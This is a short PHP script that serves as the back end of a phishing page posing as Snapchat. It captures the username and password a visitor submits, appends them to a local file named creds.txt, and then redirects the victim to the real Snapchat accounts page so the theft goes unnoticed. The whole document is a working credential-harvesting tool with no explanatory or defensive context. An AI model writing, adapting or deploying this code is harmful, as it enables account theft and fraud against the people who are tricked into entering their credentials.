<?php
file_put_contents("creds.txt", "[**] Username: " . $_POST['username'] . " Pass: " . $_POST['password']);
header('Location: https://accounts.snapchat.com/');
exit();
?>
